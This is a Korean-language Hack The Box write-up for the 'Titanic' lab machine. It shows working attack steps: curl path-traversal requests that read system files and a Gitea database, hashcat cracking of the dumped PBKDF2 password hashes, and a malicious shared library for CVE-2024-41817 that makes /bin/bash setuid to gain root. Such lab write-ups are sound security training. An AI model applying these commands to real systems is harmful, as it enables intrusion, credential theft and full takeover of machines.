# HTB-TITANIC
```bash
OS: Linux
DATE: 26.09.07
DIFFICULTY: Easy
```

## RECON
**nmap**: 전체 포트 검사 결과 22번(SSH), 80번(HTTP) 서비스만 실행 중인 것을 알게 되었다.
```bash
nmap -p- -T4 IP
nmap -sC -sV -p 22,80 IP
```

**ffuf**: 이후 brute force 공격으로 웹 디렉토리 및 서브도메인 대입을 시작했다.
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
ffuf -u http://IP -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -r -H "Host: FUZZ.IP" -fs num
```
Recon 결과 서브도메인에 dev라는 서브도메인이 있다는 것을 알게 되어 접근했다. 대상 시스템은 gitea라는 서비스를 실행 중이었다.

## Initial Access
gitea 서비스에는 developer 유저의 docker-config repo와 flask-app repo가 있었다. docker-config를 먼저 확인해본 결과 mysql 서비스 정보와 gitea 서비스 정보를 얻을 수 있었다.
```bash
services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always

version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```
이후 flask-app repo를 확인해본 결과 기본 HTTP 서버 코드 정보들이 있었다. 코드를 확인해본 결과는 다음과 같다.
```python
@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```
소스 코드에서 LFI 취약점을 발견할 수 있었다. `/download` 웹 디렉토리에서 검증을 하지 않고 ticket 파라미터를 바로 실행할 수 있게 하여 취약점이 생길 수 있다는 것을 알게 되었다. 그래서 curl로 `/etc/passwd`를 확인해본 결과 취약하다는 것을 알게 되었다.
```bash
curl "http://IP/download?ticket=../../../../../etc/passwd" --path-as-is
```
그리고 아까 봤던 gitea 시스템 정보 중 volumes path를 나타내는 경로로 시도해본 결과 500 코드가 떴다. 디렉토리로 조회를 하면 조회가 불가능하다는 것을 알게 되었다. 또한 gitea data들의 위치가 `/home/developer/gitea/data:/data`라는 것을 알게 되어, 구글에 gitea docker data dir을 검색해본 결과 설정 파일은 `/data/gitea/conf/app.ini`에 저장되는 것을 알게 되었다. 따라서 조회를 시도해본 결과 데이터베이스 path를 얻게 되었다.
```bash
curl "http://IP/download?ticket=../../../../../home/developer/gitea/data/gitea/conf/app.ini" --path-as-is
```
```bash
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable
```
따라서 다시 한번 gitea.db를 조회해본 결과 db 파일을 얻을 수 있었다.
```bash
curl "http://IP/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db" --path-as-is --output db
```
file 명령어로 `db`를 조회해본 결과 sqlite3 db라는 것을 알게 되어 sqlite3로 접속했다.
```bash
sqlite3 db
sqlite> .table
sqlite> SELECT * FROM user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
```
user table을 확인해본 결과 바로 알아볼 수 없는 hash들이 난무했다. 따라서 gitea hash를 검색한 결과 PBKDF2라는 passwd hash라는 것을 알게 되었다. 그래서 다시 한번 gitea PBKDF2 passwd cracker를 검색한 결과 `gitea2hashcat.py`라는 tool을 얻어 실행할 수 있었다.

**PBKDF2 crack 방법**:
- 먼저 `select email,salt,passwd,passwd_hash_algo from user;`를 이용하여 user의 email, salt, passwd, passwd_hash_algo를 뽑아준다.
- 이후 나온 모든 내용을 tool을 이용하여 돌린다. `python3 gitea2hashcat.py "salt|passwd"` 그러면 `sha256:50000:84tYBjhEkHXk7bOdRvSz4g==:S4xil/s3/u1GZZEhrwjeOAV7vlPUIlyIC8tjQDn/lrjqA5HhpeNM9PigFsVKLRXEbzY=` 이와 같은, hashcat 10900 모드 전용 즉 PBKDF2-HMAC-SHA256 크래킹 전용 hash가 생성된다.
- 나온 hash를 파일에 저장한 후 hashcat을 돌린다. `hashcat -m 10900 hash.txt rockyou.txt`

따라서 developer의 passwd를 얻어 ssh 로그인을 시도해본 결과 성공할 수 있었다.
![user](attach_real/Pasted%20image%2020260907134015.png)

## Privilege Escalation
처음 developer 쉘에 접속한 후 많은 것을 확인하고 시도해보았다. 먼저 여러 디렉토리들을 열거해본 결과 `/opt/scripts/identify_images.sh` 스크립트가 있다는 것을 확인할 수 있었고, 확인해본 결과 /opt/app/static/assets/images/ 폴더 안에 있는 jpg 파일을 찾아서 메타데이터를 뽑아 metadata.log에 기록하는 도구인 것을 알게 되었다.
```bash
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```
그래서 `/opt/app/static/assets/images/` 경로로 이동해본 결과 쓰기와 읽기가 가능했고, crontab으로는 확인하지 못했지만 `pspy64`라는 도구를 통해 metadata.log 파일이 root 권한으로 1분마다 실행된다는 것을 알게 되었다. 즉 정리하자면, `/opt/app/static/assets/images`에 있는 파일들을 magick이라는 프로그램으로 처리하고 그게 metadata.log에 저장되는 것이다. 따라서 magick 버전에 대한 취약점이 있는지 찾아보았다. magick 프로그램에는 CVE-2024-41817이라는 취약점이 있었고, 컴파일되는 방식 때문에 현재 작업 디렉터리가 구성 파일 및 공유 라이브러리의 검색 경로에 포함된다는 것을 알게 되었다. 따라서 PoC를 찾고 실행해보았다.
```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```
이후 `magick /dev/null /dev/null`을 확인해본 결과 id를 확인할 수 있었고, suid로 수정했다.
```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("chmod +s /bin/bash");
    exit(0);
}
EOF
```
```bash
/bin/bash -p
```
이후 약 1분을 기다린 결과 root 쉘을 얻을 수 있었다.
![root](attach_real/Pasted%20image%2020260907133934.png)

## New Inform
- 항상 LFI 취약점을 의심하자.
- 구글링은 중요하다. 모든 걸 구글링하자.
- pspy를 사용하자.